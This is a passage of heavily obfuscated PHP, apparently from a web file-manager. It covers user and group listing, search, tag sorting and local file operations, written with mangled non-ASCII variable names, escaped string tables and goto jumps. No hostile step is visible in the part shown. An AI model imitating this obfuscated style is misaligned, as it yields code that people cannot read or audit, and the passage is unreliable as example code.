($É¨ºìÍÚ as $¸ìòåº¶ => $¯Ô£ÒÌ›) { $íĞŠ¨»Æ = array($× ıË¢˜[1797] => $¶¿»ùÌ, $× ıË¢˜[1998] => $¸ìòåº¶, $× ıË¢˜[2106] => $¯Ô£ÒÌ›); $íĞŠ¨»Æ[$× ıË¢˜[2022]] = isset($É“¾Œ¦÷[$éÜ¹™]) ? $É“¾Œ¦÷[$éÜ¹™] : 0; $éÜ¹™++; $İàŒ“ÙÔ[] = $íĞŠ¨»Æ; } return $½éÔúËŸ->addAll($İàŒ“ÙÔ, array(), !0); } protected function userGroupAdd($™˜åáÑ, $Æ¨ï›’Ø = array()) { $â¼ËŞ˜ä =& $_SERVER[ÅÄÇĞô]; $íÔ¼àÁü = $this->getInfoSimple($™˜åáÑ); if (!$íÔ¼àÁü || empty($Æ¨ï›’Ø)) { return !1; } $Óøì‡¿Ô = array(); foreach ($Æ¨ï›’Ø as $°Ü²ÚØ² => $¸ÜˆÁ½) { $Óøì‡¿Ô[] = array($â¼ËŞ˜ä[1797] => $™˜åáÑ, $â¼ËŞ˜ä[1998] => $°Ü²ÚØ², $â¼ËŞ˜ä[2106] => $¸ÜˆÁ½, $â¼ËŞ˜ä[2022] => 0); } return Model($â¼ËŞ˜ä[2092])->addAll($Óøì‡¿Ô, array(), !0); } protected function userGroupRemove($¡´»ÚŞ×, $®¼ÑÛçï) { $äãÒı‰ü =& $_SERVER[ÅÄÇĞô]; $ÇÑ²øÊÇ = $this->getInfoSimple($¡´»ÚŞ×); if (!$ÇÑ²øÊÇ || !$®¼ÑÛçï) { return !1; } $Ï˜¥‘š² = array($äãÒı‰ü[1788] => $¡´»ÚŞ×, $äãÒı‰ü[2090] => $®¼ÑÛçï); return Model($äãÒı‰ü[2092])->where($Ï˜¥‘š²)->delete(); } public function listData() { $á©ºóÑ¹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($á©ºóÑ¹[$_SERVER[ÅÄÇĞô][448]]); return $á©ºóÑ¹; } public function listByID($ÒáŸ­å) { $à­÷õ‰Ò =& $_SERVER[ÅÄÇĞô]; if (!$ÒáŸ­å) { return; } $¼Ñ ‘œ = array($à­÷õ‰Ò[1797] => array($à­÷õ‰Ò[7], $ÒáŸ­å)); $ÕüÍ†¨ = $this->where($¼Ñ ‘œ)->select(); $ÕüÍ†¨ = array_sort_keep($ÕüÍ†¨, $à­÷õ‰Ò[1797], $ÒáŸ­å); $this->_listDataApply($ÕüÍ†¨); return $ÕüÍ†¨; } public function listByGroup($Šæ»·ß¹ = 0, $—§²–â« = array()) { $è¹‘ó½Ğ =& $_SERVER[ÅÄÇĞô]; $”°  = $è¹‘ó½Ğ[12]; $£‡„„ƒ = array(); if ($Šæ»·ß¹) { $£‡„„ƒ = array($è¹‘ó½Ğ[2529] => intval($Šæ»·ß¹)); $”°  = "\114\x45\x46\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\x65\x72\x5f\x67\162\157\165\x70\40\x75\x73\145\162\137\147\x72\157\x75\160\40\x6f\x6e\40\x75\x73\145\162\56\165\163\x65\162\x49\x44\40\x3d\x20\x75\163\x65\x72\137\147\162\157\x75\x70\x2e\x75\x73\145\x72\x49\x44"; $ãÇµ–± = Input::get($è¹‘ó½Ğ[533], null, $è¹‘ó½Ğ[12]) ? $è¹‘ó½Ğ[12] : $è¹‘ó½Ğ[2530]; } if (isset($—§²–â«[$è¹‘ó½Ğ[845]])) { $£‡„„ƒ[$è¹‘ó½Ğ[2531]] = $—§²–â«[$è¹‘ó½Ğ[845]]; } $…œÃ±¤ = _get($—§²–â«, $è¹‘ó½Ğ[2532], $è¹‘ó½Ğ[234]); if (_get($—§²–â«, $è¹‘ó½Ğ[855], !1)) { $£‡„„ƒ[$…œÃ±¤] = array($è¹‘ó½Ğ[2278], $—§²–â«[$è¹‘ó½Ğ[855]]); } if (_get($—§²–â«, $è¹‘ó½Ğ[856], !1)) { $›Çõ›Í‘ = array($è¹‘ó½Ğ[2279], $—§²–â«[$è¹‘ó½Ğ[856]]); if ($£‡„„ƒ[$…œÃ±¤]) { $£‡„„ƒ[$…œÃ±¤] = array($£‡„„ƒ[$…œÃ±¤], $›Çõ›Í‘, $è¹‘ó½Ğ[2280]); } else { $£‡„„ƒ[$…œÃ±¤] = $›Çõ›Í‘; } } $áÏ¶È‡§ = $this->_makeOrder($ãÇµ–±)->field($è¹‘ó½Ğ[2533])->where($£‡„„ƒ)->join($”° )->selectPage(50); $this->_listDataApply($áÏ¶È‡§[$è¹‘ó½Ğ[448]]); return $áÏ¶È‡§; } private function _makeOrder($€Ø¨Èšô = '') { $ĞéÔøÃ„ =& $_SERVER[ÅÄÇĞô]; $å–š¦çÔ = array($ĞéÔøÃ„[1797], $ĞéÔøÃ„[32], $ĞéÔøÃ„[1986], $ĞéÔøÃ„[2208], $ĞéÔøÃ„[1958], $ĞéÔøÃ„[234]); $ñ¼‹æÃÊ = array($ĞéÔøÃ„[526] => $ĞéÔøÃ„[527], $ĞéÔøÃ„[528] => $ĞéÔøÃ„[529]); $àíõ¸§ = Input::get($ĞéÔøÃ„[533], $ĞéÔøÃ„[7], $ĞéÔøÃ„[1788], $å–š¦çÔ); $ãÄÈªÌü = Input::get($ĞéÔøÃ„[534], $ĞéÔøÃ„[7], $ĞéÔøÃ„[2093], array($ĞéÔøÃ„[2093], $ĞéÔøÃ„[528])); $ãÄÈªÌü = $ñ¼‹æÃÊ[$ãÄÈªÌü]; $€Ø¨Èšô = $€Ø¨Èšô . "\x75\x73\145\162\x2e{$àíõ¸§}\x20{$ãÄÈªÌü}\x2c\40\x75\x73\145\162\x2e\165\x73\145\x72\111\104\x20\x61\x73\x63"; return $this->alias($ĞéÔøÃ„[2224])->order($€Ø¨Èšô); } public function listSearch($ÅºüÆ¼ó) { $æ­íï¾Ÿ =& $_SERVER[ÅÄÇĞô]; $Á´Û¦¨² = trim($ÅºüÆ¼ó[$æ­íï¾Ÿ[2096]]); $‹åê‹Ÿ = explode($æ­íï¾Ÿ[53], $Á´Û¦¨²); if (!$Á´Û¦¨² || count($‹åê‹Ÿ) == 1) { return $this->listSearchNow($ÅºüÆ¼ó); } $‚Ü±ª™ş = array($æ­íï¾Ÿ[448] => array()); foreach ($‹åê‹Ÿ as $¤™ãÚç”) { if (!trim($¤™ãÚç”)) { continue; } $ÅºüÆ¼ó[$æ­íï¾Ÿ[2096]] = $¤™ãÚç”; $„ÆÀ‰áÔ = $this->listSearchNow($ÅºüÆ¼ó); $‚Ü±ª™ş[$æ­íï¾Ÿ[448]] = array_merge($‚Ü±ª™ş[$æ­íï¾Ÿ[448]], $„ÆÀ‰áÔ[$æ­íï¾Ÿ[448]]); } $‚Ü±ª™ş[$æ­íï¾Ÿ[448]] = array_unique_by_key($‚Ü±ª™ş[$æ­íï¾Ÿ[448]], $æ­íï¾Ÿ[1797]); $‚Ü±ª™ş[$æ­íï¾Ÿ[445]] = array($æ­íï¾Ÿ[446] => count($‚Ü±ª™ş[$æ­íï¾Ÿ[448]]), $æ­íï¾Ÿ[442] => 20, $æ­íï¾Ÿ[431] => 1, $æ­íï¾Ÿ[447] => 1); return $‚Ü±ª™ş; } public function listSearchNow($Å½¦»õ) { $½»İêˆã =& $_SERVER[ÅÄÇĞô]; $ªºõ‹¥ö = trim($Å½¦»õ[$½»İêˆã[2096]]); $Èü£Ş¢ = isset($Å½¦»õ[$½»İêˆã[2097]]) ? $Å½¦»õ[$½»İêˆã[2097]] : !1; $ªºõ‹¥ö = str_replace($½»İêˆã[2098], $½»İêˆã[2099], trim($ªºõ‹¥ö)); $Ù²‚¹¤ = array($½»İêˆã[32] => array($½»İêˆã[462], "\x25{$ªºõ‹¥ö}\x25"), $½»İêˆã[383] => array($½»İêˆã[462], "{$ªºõ‹¥ö}\45"), $½»İêˆã[2297] => array($½»İêˆã[462], "{$ªºõ‹¥ö}\45"), $½»İêˆã[1100] => $½»İêˆã[2100]); if (Input::check($ªºõ‹¥ö, $½»İêˆã[389])) { $Ù²‚¹¤[$½»İêˆã[1797]] = array($½»İêˆã[462], "{$ªºõ‹¥ö}\45"); $Ù²‚¹¤[$½»İêˆã[2514]] = array($½»İêˆã[462], "{$ªºõ‹¥ö}\x25"); } if (!$ªºõ‹¥ö) { $Ù²‚¹¤ = array(); } if (isset($Å½¦»õ[$½»İêˆã[845]])) { $Ù²‚¹¤[$½»İêˆã[845]] = $Å½¦»õ[$½»İêˆã[845]]; } $Ù²‚¹¤ = $this->parseWhereLike($Ù²‚¹¤); $‹÷ÒñÅ­ = $this->_makeOrder()->where($Ù²‚¹¤)->selectPage(20); if (!$‹÷ÒñÅ­ || count($‹÷ÒñÅ­[$½»İêˆã[448]]) < 5 && Input::check($ªºõ‹¥ö, $½»İêˆã[396])) { $²²«ëÀ = $this->_searchFromMeta($½»İêˆã[540], $ªºõ‹¥ö, 10); $¿Ãì†€Ã = $this->_searchFromMeta($½»İêˆã[541], $ªºõ‹¥ö, 10); $¿Ÿ±ˆ¯ = array_merge($²²«ëÀ, $¿Ãì†€Ã, $‹÷ÒñÅ­[$½»İêˆã[448]]); $‹÷ÒñÅ­[$½»İêˆã[448]] = array_unique_by_key($¿Ÿ±ˆ¯, $½»İêˆã[1797]); $‹÷ÒñÅ­[$½»İêˆã[445]][$½»İêˆã[446]] = count($‹÷ÒñÅ­[$½»İêˆã[448]]); $‹÷ÒñÅ­[$½»İêˆã[445]][$½»İêˆã[447]] = ceil($‹÷ÒñÅ­[$½»İêˆã[445]][$½»İêˆã[446]] / $‹÷ÒñÅ­[$½»İêˆã[445]][$½»İêˆã[442]]); } $this->_listDataApply($‹÷ÒñÅ­[$½»İêˆã[448]]); $this->_filterByGroup($‹÷ÒñÅ­, $Èü£Ş¢); return $‹÷ÒñÅ­; } private function _filterByGroup(&$§œÇ‚İ, $˜‰½ÈÂ) { $­ãÀÉÚœ =& $_SERVER[ÅÄÇĞô]; if (!$˜‰½ÈÂ) { return $§œÇ‚İ; } foreach ($§œÇ‚İ[$­ãÀÉÚœ[448]] as $Ë™Ô¥´‹ => &$Ä™Ä‹Ö¡) { $ß…ïÌªÛ = array_to_keyvalue($Ä™Ä‹Ö¡[$­ãÀÉÚœ[2193]], $­ãÀÉÚœ[12], $­ãÀÉÚœ[1998]); if (!in_array($˜‰½ÈÂ, $ß…ïÌªÛ)) { unset($§œÇ‚İ[$­ãÀÉÚœ[448]][$Ë™Ô¥´‹]); } } unset($Ä™Ä‹Ö¡); $§œÇ‚İ[$­ãÀÉÚœ[448]] = array_values($§œÇ‚İ[$­ãÀÉÚœ[448]]); $§œÇ‚İ[$­ãÀÉÚœ[445]] = array($­ãÀÉÚœ[2261] => count($§œÇ‚İ[$­ãÀÉÚœ[448]]), $­ãÀÉÚœ[2259] => $§œÇ‚İ[$­ãÀÉÚœ[445]][$­ãÀÉÚœ[442]], $­ãÀÉÚœ[2258] => 1, $­ãÀÉÚœ[2260] => 1); } private function _searchFromMeta($ö“š¶Ë¤, $Å€¿×´, $ï·çÅ¡Ã) { $éß‰˜¼Ğ =& $_SERVER[ÅÄÇĞô]; $Å€¿×´ = strtolower($Å€¿×´); $¸¼¢Í‘ = array($éß‰˜¼Ğ[97] => $ö“š¶Ë¤, $éß‰˜¼Ğ[453] => array($éß‰˜¼Ğ[462], "\45{$Å€¿×´}\x25")); $¸¼¢Í‘ = $this->parseWhereLike($¸¼¢Í‘); $¨Ş³Ø¤· = Model($éß‰˜¼Ğ[2534])->where($¸¼¢Í‘)->limit($ï·çÅ¡Ã)->select(); if (!$¨Ş³Ø¤·) { return array(); } $¨Ş³Ø¤· = array_to_keyvalue($¨Ş³Ø¤·, $éß‰˜¼Ğ[12], $éß‰˜¼Ğ[1797]); $‡¨­½–’ = $this->where(array($éß‰˜¼Ğ[1788] => array($éß‰˜¼Ğ[7], $¨Ş³Ø¤·)))->select(); if (!$‡¨­½–’) { return array(); } return $‡¨­½–’; } private function _listDataApplyItem($Î¯û„”€) { $€Ù”ŸËà = array($Î¯û„”€); $this->_listDataApply($€Ù”ŸËà); return $€Ù”ŸËà[0]; } private function _listDataApply(&$¥éŠñÛ) { $Åä¿ © =& $_SERVER[ÅÄÇĞô]; if (!$¥éŠñÛ) { return; } array_remove_key($¥éŠñÛ, $Åä¿ ©[989]); $Î¬öæ·ß = array_to_keyvalue($¥éŠñÛ, $Åä¿ ©[12], $Åä¿ ©[1797]); $this->_listAppendGroup($¥éŠñÛ, $Î¬öæ·ß); $this->_listAppendMeta($¥éŠñÛ, $Î¬öæ·ß); $this->_listAppendSourceRoot($¥éŠñÛ, $Î¬öæ·ß); } private function _listAppendSourceRoot(&$öƒåíê’, $ÁÛ™â÷Ó) { $ÂµÅŞÄ† =& $_SERVER[ÅÄÇĞô]; $©„•Òëİ = Model($ÂµÅŞÄ†[925])->listSourceRoot(SourceModel::TYPE_USER, $ÁÛ™â÷Ó); $©„•Òëİ = array_to_keyvalue($©„•Òëİ, $ÂµÅŞÄ†[574]); $©„•Òëİ = array_remove_key($©„•Òëİ, $ÂµÅŞÄ†[574]); foreach ($öƒåíê’ as &$õøî‰é­) { $õøî‰é­[$ÂµÅŞÄ†[90]] = $©„•Òëİ[$õøî‰é­[$ÂµÅŞÄ†[1797]]] ? $©„•Òëİ[$õøî‰é­[$ÂµÅŞÄ†[1797]]] : array(); } unset($õøî‰é­); } private function _listAppendGroup(&$ĞÜŒÛ¶ğ, $¬ÍìŠÒ¶) { $ŸìèŒ¼© =& $_SERVER[ÅÄÇĞô]; $åŞÔ¿œ™ = array($ŸìèŒ¼©[1797] => array($ŸìèŒ¼©[7], $¬ÍìŠÒ¶)); $ÕóÒğíü = Model($ŸìèŒ¼©[2092])->where($åŞÔ¿œ™)->select(); $¡µ“­Ùé = array_to_keyvalue($ÕóÒğíü, $ŸìèŒ¼©[12], $ŸìèŒ¼©[1998]); $¡µ“­Ùé = array_remove_value(array_unique($¡µ“­Ùé), $ŸìèŒ¼©[231]); if (!$¡µ“­Ùé || !$ÕóÒğíü) { return; } $åŞÔ¿œ™ = array($ŸìèŒ¼©[1998] => array($ŸìèŒ¼©[7], $¡µ“­Ùé)); $ĞŸ£’õÒ = Model($ŸìèŒ¼©[2191])->field($ŸìèŒ¼©[2535])->where($åŞÔ¿œ™)->select(); $ĞŸ£’õÒ = array_to_keyvalue($ĞŸ£’õÒ, $ŸìèŒ¼©[1998]); $ÕóÒğíü = array_to_keyvalue_group($ÕóÒğíü, $ŸìèŒ¼©[1797]); foreach ($ÕóÒğíü as &$ä²ÛïıÇ) { $‡ÓÀ§»Ğ = array(); foreach ($ä²ÛïıÇ as $ÔÉ¤„¸Ó) { if (!$ÔÉ¤„¸Ó[$ŸìèŒ¼©[2106]]) { continue; } $²ä§Ğ‡« = Model($ŸìèŒ¼©[576])->listData($ÔÉ¤„¸Ó[$ŸìèŒ¼©[2106]]); $‡ÓÀ§»Ğ[] = array($ŸìèŒ¼©[1998] => $ÔÉ¤„¸Ó[$ŸìèŒ¼©[1998]], $ŸìèŒ¼©[2536] => $ĞŸ£’õÒ[$ÔÉ¤„¸Ó[$ŸìèŒ¼©[1998]]][$ŸìèŒ¼©[32]], $ŸìèŒ¼©[589] => $ĞŸ£’õÒ[$ÔÉ¤„¸Ó[$ŸìèŒ¼©[1998]]][$ŸìèŒ¼©[589]], $ŸìèŒ¼©[490] => $²ä§Ğ‡«); } $ä²ÛïıÇ = $‡ÓÀ§»Ğ; } unset($ä²ÛïıÇ); foreach ($ĞÜŒÛ¶ğ as &$ôÒîê˜Î) { $ôÒîê˜Î[$ŸìèŒ¼©[2193]] = array(); if (isset($ÕóÒğíü[$ôÒîê˜Î[$ŸìèŒ¼©[1797]]])) { $ôÒîê˜Î[$ŸìèŒ¼©[2193]] = $ÕóÒğíü[$ôÒîê˜Î[$ŸìèŒ¼©[1797]]]; } } unset($ôÒîê˜Î); } public function userAppendGroup($‰ú—…¨) { $éÃ‡˜’ğ =& $_SERVER[ÅÄÇĞô]; if (!$‰ú—…¨) { return array(); } $this->_listAppendGroup($‰ú—…¨, array_to_keyvalue($‰ú—…¨, $éÃ‡˜’ğ[12], $éÃ‡˜’ğ[1797])); return $‰ú—…¨; } private function _listAppendMeta(&$Œ¤¢Ú³, $Ò„æ¶Š¿) { $‚âæÌŸ =& $_SERVER[ÅÄÇĞô]; $Ş ÊË” = UserJobModel::JOB_KEY; $¿Éæ’ˆÏ = array($‚âæÌŸ[2515]); $‚†’¹æş = array($‚âæÌŸ[1797] => array($‚âæÌŸ[7], $Ò„æ¶Š¿)); $Á­ïÖµ¿ = Model($‚âæÌŸ[2513])->where($‚†’¹æş)->select(); $Á­ïÖµ¿ = array_to_keyvalue_group($Á­ïÖµ¿, $‚âæÌŸ[1797]); foreach ($Á­ïÖµ¿ as &$ÚÙÓ³ôô) { $¢€×ÕÒ× = array(); foreach ($ÚÙÓ³ôô as $ÌÈí±Öé) { if (!in_array($ÌÈí±Öé[$‚âæÌŸ[97]], $¿Éæ’ˆÏ)) { $¢€×ÕÒ×[$ÌÈí±Öé[$‚âæÌŸ[97]]] = $ÌÈí±Öé[$‚âæÌŸ[453]]; } } $ÚÙÓ³ôô = $¢€×ÕÒ×; } unset($ÚÙÓ³ôô); $¤Î•†÷Ğ = Model($‚âæÌŸ[2537]); foreach ($Œ¤¢Ú³ as &$Ô€äôôÇ) { $²áàÜÏ = array(); if (isset($Á­ïÖµ¿[$Ô€äôôÇ[$‚âæÌŸ[1797]]])) { $²áàÜÏ = $Á­ïÖµ¿[$Ô€äôôÇ[$‚âæÌŸ[1797]]]; } $Ô€äôôÇ[$‚âæÌŸ[2538]] = array(); if (isset($²áàÜÏ[$Ş ÊË”])) { $Ô€äôôÇ[$‚âæÌŸ[2538]] = $¤Î•†÷Ğ->getUserJobInfo($²áàÜÏ[$Ş ÊË”]); } } unset($Ô€äôôÇ); } protected function groupUserAll($¼†°èÖö) { $ê¸úæšÉ =& $_SERVER[ÅÄÇĞô]; if (!$¼†°èÖö) { return !1; } $æÙ² ¤ = Model($ê¸úæšÉ[2092])->field($ê¸úæšÉ[1797])->where(array($ê¸úæšÉ[1998] => array($ê¸úæšÉ[7], $¼†°èÖö)))->select(); $æÙ² ¤ = array_to_keyvalue($æÙ² ¤, $ê¸úæšÉ[12], $ê¸úæšÉ[1797]); return array_unique($æÙ² ¤); } public function userSearch($š¦®Ìõî, $°ñ¡õÑÂ = "\x2a") { return Model($_SERVER[ÅÄÇĞô][602])->where($š¦®Ìõî)->field($°ñ¡õÑÂ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($÷é’¤Øá) { $‰œ‹Ù³± =& $_SERVER[ÅÄÇĞô]; $“³×²„ = defined($‰œ‹Ù³±[2228]) && USER_ID ? USER_ID : $‰œ‹Ù³±[12]; return "\x55\163\x65\162\x4f\160\x74\151\157\x6e\137{$÷é’¤Øá}\137" . $“³×²„; } protected function filterWhere($ì»ŠÙñ¿) { $ÕÇì‘îû =& $_SERVER[ÅÄÇĞô]; $ì»ŠÙñ¿[$ÕÇì‘îû[1797]] = defined($ÕÇì‘îû[2228]) && USER_ID ? USER_ID : $ÕÇì‘îû[12]; return $ì»ŠÙñ¿; } public function cacheRemoveUser($ğÇŠø‘Ñ, $ğŠ³·íò) { return Cache::remove("\125\163\x65\x72\117\160\x74\151\157\156\137{$ğÇŠø‘Ñ}\137" . $ğŠ³·íò); } protected function optionDefault($õ°­š¹× = '') { $´¶åôº =& $_SERVER[ÅÄÇĞô]; if ($õ°­š¹× == $´¶åôº[12]) { return $GLOBALS[$´¶åôº[6]][$´¶åôº[2539]]; } if ($õ°­š¹× == $´¶åôº[2540]) { return $GLOBALS[$´¶åôº[6]][$´¶åôº[2541]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\x2e\x74\141\x67\114\x69\x73\x74"; public $modelType = "\125\163\x65\162\117\x70\x74\151\157\156"; public $field = array("\x6e\141\155\x65", "\163\164\171\x6c\x65", "\163\157\162\164"); public function listData($üÕĞ•°ñ = false, $â©š¼éƒ = "\163\157\162\164", $ãº“Ë = false) { return parent::listData($üÕĞ•°ñ, $â©š¼éƒ, $ãº“Ë); } public function remove($ÀËòª¾ş) { return parent::remove($ÀËòª¾ş); } public function add($Ìë¬›÷ƒ, $Á»î‰¢ = "\x6c\141\142\x65\x6c\55\x67\162\145\171\55\156\157\x72\x6d\141\154") { $†ÚÆ¸¤û =& $_SERVER[ÅÄÇĞô]; if ($this->findByName($Ìë¬›÷ƒ)) { return !1; } $şŸôøÙğ = array($†ÚÆ¸¤û[497] => $Ìë¬›÷ƒ, $†ÚÆ¸¤û[563] => $Á»î‰¢, $†ÚÆ¸¤û[2002] => $this->getSort($†ÚÆ¸¤û[338]) + 1); return parent::insert($şŸôøÙğ); } public function update($È¸Ì¹®Ú, $Î™Æ²ŠÁ) { $—õúêÙÑ =& $_SERVER[ÅÄÇĞô]; $–Í¥“ÌÍ = $this->listData($È¸Ì¹®Ú); $¢åáÏ¯ = $this->findByName($Î™Æ²ŠÁ[$—õúêÙÑ[32]]); if (!$–Í¥“ÌÍ || $¢åáÏ¯ && $¢åáÏ¯[$—õúêÙÑ[478]] != $–Í¥“ÌÍ[$—õúêÙÑ[478]]) { return !1; } return parent::update($È¸Ì¹®Ú, $Î™Æ²ŠÁ); } public function moveTop($İ­½ÜùÎ) { $ÄÊÅ°Ã½ =& $_SERVER[ÅÄÇĞô]; $Óòè—šÕ = parent::listData(); $îµŠ®ö€ = $this->getSort($ÄÊÅ°Ã½[337]); foreach ($Óòè—šÕ as &$óƒ«‹›Ñ) { if ($óƒ«‹›Ñ[$ÄÊÅ°Ã½[478]] == $İ­½ÜùÎ) { $óƒ«‹›Ñ[$ÄÊÅ°Ã½[2022]] = $îµŠ®ö€; continue; } $óƒ«‹›Ñ[$ÄÊÅ°Ã½[2022]] += 1; } unset($óƒ«‹›Ñ); return parent::resetData($Óòè—šÕ); } public function moveBottom($ì–ÛãüŸ) { $ù‘³İˆœ =& $_SERVER[ÅÄÇĞô]; $ğÇŸÑä¡ = $this->getSort($ù‘³İˆœ[338]) + 1; return parent::update($ì–ÛãüŸ, array($ù‘³İˆœ[2022] => $ğÇŸÑä¡)); } public function resetSort($ú–ä¹Şê) { $¶¬§ı€¦ =& $_SERVER[ÅÄÇĞô]; $ò¯½ÎÇ® = array(); $ú–ä¹Şê = is_array($ú–ä¹Şê) ? $ú–ä¹Şê : array(); for ($ìÓ•¦ˆÈ = 0; $ìÓ•¦ˆÈ < count($ú–ä¹Şê); $ìÓ•¦ˆÈ++) { $ò¯½ÎÇ®[$ú–ä¹Şê[$ìÓ•¦ˆÈ] . $¶¬§ı€¦[12]] = $ìÓ•¦ˆÈ + 1; } $Ô¨›†ºÏ = parent::listData(); foreach ($Ô¨›†ºÏ as &$Ñ¦ª§¨­) { $†¥ ·ä = $ò¯½ÎÇ®[$Ñ¦ª§¨­[$¶¬§ı€¦[478]]]; $Ñ¦ª§¨­[$¶¬§ı€¦[2022]] = $†¥ ·ä ? $†¥ ·ä : $Ñ¦ª§¨­[$¶¬§ı€¦[2022]]; } unset($Ñ¦ª§¨­); return parent::resetData($Ô¨›†ºÏ); } private function getSort($úã‚Ü…) { $êŸìùûÔ =& $_SERVER[ÅÄÇĞô]; $¹Á¤õŒ = parent::listData(); $¹É¿‹›Á = array_to_keyvalue($¹Á¤õŒ, $êŸìùûÔ[12], $êŸìùûÔ[2022]); if (!$¹É¿‹›Á) { $¹É¿‹›Á = array(0); } $Ãá’¥»ğ = $úã‚Ü… == $êŸìùûÔ[338] ? max($¹É¿‹›Á) : min($¹É¿‹›Á); return intval($Ãá’¥»ğ); } } goto f§È›¶•ÊÂ; c¡ÈÔ¸ŸŸÚ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($íõ¥„ŸÍ) { if (substr($íõ¥„ŸÍ, 0, 2) == $_SERVER[ÅÄÇĞô][1434]) { $íõ¥„ŸÍ = BASIC_PATH . substr($íõ¥„ŸÍ, 2); } return $íõ¥„ŸÍ; } public function iconvApp($¸”´°Ô’) { $¤Şûˆ€ =& $_SERVER[ÅÄÇĞô]; global $config; return $this->iconvTo($¸”´°Ô’, $config[$¤Şûˆ€[1463]], $config[$¤Şûˆ€[1462]]); } public function iconvSystem($šì®¹») { $öÄº¡óÂ =& $_SERVER[ÅÄÇĞô]; global $config; return $this->iconvTo($šì®¹», $config[$öÄº¡óÂ[1462]], $config[$öÄº¡óÂ[1463]]); } public function getPathOuter($·Ñ‚„¬á) { $õ…¦µÎ  =& $_SERVER[ÅÄÇĞô]; $ƒ¦œø¬î = $this->iconvApp($this->pathBase); $·Ñ‚„¬á = $this->iconvApp($·Ñ‚„¬á); if (substr($ƒ¦œø¬î, 0, 2) == $õ…¦µÎ [1434]) { $ƒ¦œø¬î = BASIC_PATH . substr($ƒ¦œø¬î, 2); } if (substr($·Ñ‚„¬á, 0, 2) == $õ…¦µÎ [1434]) { $·Ñ‚„¬á = BASIC_PATH . substr($·Ñ‚„¬á, 2); } $ƒ¦œø¬î = KodIO::clear($ƒ¦œø¬î); $·Ñ‚„¬á = KodIO::clear($·Ñ‚„¬á); $·Ñ‚„¬á = substr($·Ñ‚„¬á, strlen($ƒ¦œø¬î)); if (empty($this->pathDriver)) { return $·Ñ‚„¬á; } return $this->pathDriver . $õ…¦µÎ [8] . ltrim($·Ñ‚„¬á, $õ…¦µÎ [8]); } public function mkfile($ÜüèÁî, $¨†½©·Æ = '', $ã³áşÙÙ = REPEAT_RENAME) { $ÜüèÁî = $this->iconvSystem($ÜüèÁî); @touch($ÜüèÁî); if ($¨†½©·Æ) { file_put_contents($ÜüèÁî, $¨†½©·Æ); } @chmod($ÜüèÁî, $this->pathAuth); if (is_file($ÜüèÁî)) { return $this->getPathOuter($ÜüèÁî); } $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } public function mkdir($ıÓÀ‘±», $´ò×¥—° = REPEAT_SKIP) { $ıÓÀ‘±» = $this->iconvSystem($ıÓÀ‘±»); if (is_dir($ıÓÀ‘±»)) { return $this->getPathOuter($ıÓÀ‘±»); } @mkdir($ıÓÀ‘±», $this->pathAuth, !0); @chmod($ıÓÀ‘±», $this->pathAuth); if (is_dir($ıÓÀ‘±»)) { return $this->getPathOuter($ıÓÀ‘±»); } $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } public function copyFile($òéßïê, $ÖÒÍŒíÑ) { $this->mkdir($this->pathFather($ÖÒÍŒíÑ)); $òéßïê = $this->iconvSystem($òéßïê); $ÖÒÍŒíÑ = $this->iconvSystem($ÖÒÍŒíÑ); $ºá”ÜúÍ = copy_64($òéßïê, $ÖÒÍŒíÑ); @chmod($ÖÒÍŒíÑ, $this->pathAuth); if ($ºá”ÜúÍ) { return $this->getPathOuter($ÖÒÍŒíÑ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } public function moveFile($˜İØŸÜº, $Í‰ÒÉüï) { $this->mkdir($this->pathFather($Í‰ÒÉüï)); $˜İØŸÜº = $this->iconvSystem($˜İØŸÜº); $Í‰ÒÉüï = $this->iconvSystem($Í‰ÒÉüï); $„÷¶™¯² = intval(@rename($˜İØŸÜº, $Í‰ÒÉüï)); if (!$„÷¶™¯²) { if ($„÷¶™¯² = intval(@copy_64($˜İØŸÜº, $Í‰ÒÉüï))) { @unlink($˜İØŸÜº); } } @chmod($Í‰ÒÉüï, $this->pathAuth); if ($„÷¶™¯²) { return $this->getPathOuter($Í‰ÒÉüï); } $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } public function movePath($¼†â¹Çü, $²ÈÄşîã, $¤°Ãòõ = false) { $Ÿ¦õœ¬ä =& $_SERVER[ÅÄÇĞô]; $¼†â¹Çü = $this->iconvSystem($¼†â¹Çü); $²ÈÄşîã = $this->iconvSystem($²ÈÄşîã); $”å¸·œ‹ = rtrim($²ÈÄşîã, $Ÿ¦õœ¬ä[8]) . $Ÿ¦õœ¬ä[8] . ($¤°Ãòõ ? $¤°Ãòõ : get_path_this($¼†â¹Çü)); if (file_exists($”å¸·œ‹)) { return !1; } $äıÅÓÆ— = intval(@rename($¼†â¹Çü, $”å¸·œ‹)); $äıÅÓÆ— = file_exists($”å¸·œ‹); if ($äıÅÓÆ—) { return $this->getPathOuter($”å¸·œ‹); } $this->writeLog(__FUNCTION__ . $Ÿ¦õœ¬ä[1474], !0); return !1; } public function delFile($‚®Ğğåú) { $‚®Ğğåú = $this->iconvSystem($‚®Ğğåú); if (!@unlink($‚®Ğğåú)) { @chmod($‚®Ğğåú, $this->pathAuth); if (@unlink($‚®Ğğåú)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } return !0; } public function delFolder($Ò™ÉÃŒä) { $ÓÔèãá =& $_SERVER[ÅÄÇĞô]; $Ò™ÉÃŒä = $this->iconvSystem($Ò™ÉÃŒä); if (!is_dir($Ò™ÉÃŒä)) { return !0; } if (!($å˜¶ = opendir($Ò™ÉÃŒä))) { return !1; } while (($Æ§›¸„– = readdir($å˜¶)) !== !1) { if ($Æ§›¸„– == $ÓÔèãá[10] || $Æ§›¸„– == $ÓÔèãá[1386]) { continue; } $ıı†”´¿ = $Ò™ÉÃŒä . $ÓÔèãá[8] . $Æ§›¸„–; if (is_file($ıı†”´¿) || 